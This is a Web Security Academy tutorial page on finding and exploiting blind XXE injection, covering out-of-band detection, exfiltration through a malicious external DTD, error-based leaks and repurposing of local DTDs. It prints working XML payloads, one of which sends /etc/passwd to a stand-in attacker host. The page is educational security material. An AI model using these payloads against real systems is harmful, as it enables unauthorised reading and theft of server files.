# Finding and exploiting blind XXE vulnerabilities

Source: https://portswigger.net/web-security/xxe/blind
Fetched: 2026-06-28T09:18:06.468036+00:00

Web Security Academy

XXE injection

Blind

Finding and exploiting blind XXE vulnerabilities

In this section, we'll explain what blind XXE injection is and describe various techniques for finding and exploiting blind XXE vulnerabilities.

What is blind XXE?

Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.

There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.

You can trigger XML parsing errors in such a way that the error messages contain sensitive data.

Detecting blind XXE using out-of-band (OAST) techniques

You can often detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.

Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead. XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. For present purposes, you only need to know two things. First, the declaration of an XML parameter entity includes the percent character before the entity name:

<!ENTITY % myparameterentity "my parameter entity value" >

And second, parameter entities are referenced using the percent character instead of the usual ampersand:

%myparameterentity;

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

Exploiting blind XXE to exfiltrate data out-of-band

Detecting a blind XXE vulnerability via out-of-band techniques is all very well, but it doesn't actually demonstrate how the vulnerability could be exploited. What an attacker really wants to achieve is to exfiltrate sensitive data. This can be achieved via a blind XXE vulnerability, but it involves the attacker hosting a malicious DTD on a system that they control, and then invoking the external DTD from within the in-band XXE payload.

An example of a malicious DTD to exfiltrate the contents of the /etc/passwd file is as follows:

<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">

%eval;

%exfiltrate;

This DTD carries out the following steps:

Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.

Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.

Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.

Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL:

http://web-attacker.com/malicious.dtd

Finally, the attacker must submit the following XXE payload to the vulnerable application:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM

"http://web-attacker.com/malicious.dtd"> %xxe;]>

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server.

Note

This technique might not work with some file contents, including the newline characters contained in the /etc/passwd file. This is because some XML parsers fetch the URL in the external entity definition using an API that validates the characters that are allowed to appear within the URL. In this situation, it might be possible to use the FTP protocol instead of HTTP. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as /etc/hostname can be targeted instead.

Exploiting blind XXE to retrieve data via error messages

An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.

You can trigger an XML parsing error message containing the contents of the /etc/passwd file using a malicious external DTD as follows:

<!ENTITY % file SYSTEM "file:///etc/passwd">

<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">

%eval;

%error;

This DTD carries out the following steps:

Defines an XML parameter entity called file, containing the contents of the /etc/passwd file.

Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called error. The error entity will be evaluated by loading a nonexistent file whose name contains the value of the file entity.

Uses the eval entity, which causes the dynamic declaration of the error entity to be performed.

Uses the error entity, so that its value is evaluated by attempting to load the nonexistent file, resulting in an error message containing the name of the nonexistent file, which is the contents of the /etc/passwd file.

Invoking the malicious external DTD will result in an error message like the following:

java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

...

Exploiting blind XXE by repurposing a local DTD

The preceding technique works fine with an external DTD, but it won't normally work with an internal DTD that is fully specified within the DOCTYPE element. This is because the technique involves using an XML parameter entity within the definition of another parameter entity. Per the XML specification, this is permitted in external DTDs but not in internal DTDs. (Some parsers might tolerate it, but many do not.)

So what about blind XXE vulnerabilities when out-of-band interactions are blocked? You can't exfiltrate data via an out-of-band connection, and you can't load an external DTD from a remote server.

In this situation, it might still be possible to trigger error messages containing sensitive data, due to a loophole in the XML language specification. If a document's DTD uses a hybrid of internal and external DTD declarations, then the internal DTD can redefine entities that are declared in the external DTD. When this happens, the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed.

This means that an attacker can employ the error-based XXE technique from within an internal DTD, provided the XML parameter entity that they use is redefining an entity that is declared within an external DTD. Of course, if out-of-band connections are blocked, then the external DTD cannot be loaded from a remote location. Instead, it needs to be an external DTD file that is local to the application server. Essentially, the attack involves invoking a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data. This technique was pioneered by Arseniy Sharoglazov, and ranked #7 in our top 10 web hacking techniques of 2018.

For example, suppose there is a DTD file on the server filesystem at the location /usr/local/app/schema.dtd, and this DTD file defines an entity called custom_entity. An attacker can trigger an XML parsing error message containing the contents of the /etc/passwd file by submitting a hybrid DTD like the following:

<!DOCTYPE foo [

<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">

<!ENTITY % custom_entity '

<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">

&#x25;eval;

&#x25;error;

'>

%local_dtd;

]>

This DTD carries out the following steps:

Defines an XML parameter entity called local_dtd, containing the contents of the external DTD file that exists on the server filesystem.

Redefines the XML parameter entity called custom_entity, which is already defined in the external DTD file. The entity is redefined as containing the error-based XXE exploit that was already described, for triggering an error message containing the contents of the /etc/passwd file.

Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value of the custom_entity entity. This results in the desired error message.

Locating an existing DTD file to repurpose

Since this XXE attack involves repurposing an existing DTD on the server filesystem, a key requirement is to locate a suitable file. This is actually quite straightforward. Because the application returns any error messages thrown by the XML parser, you can easily enumerate local DTD files just by attempting to load them from within the internal DTD.

For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing:

<!DOCTYPE foo [

<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

%local_dtd;

]>

After you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy of the file and review it to find an entity that you can redefine. Since many common systems that include DTD files are open source, you can normally quickly obtain a copy of files through internet search.

Find XSS vulnerabilities using Burp Suite

Try for free
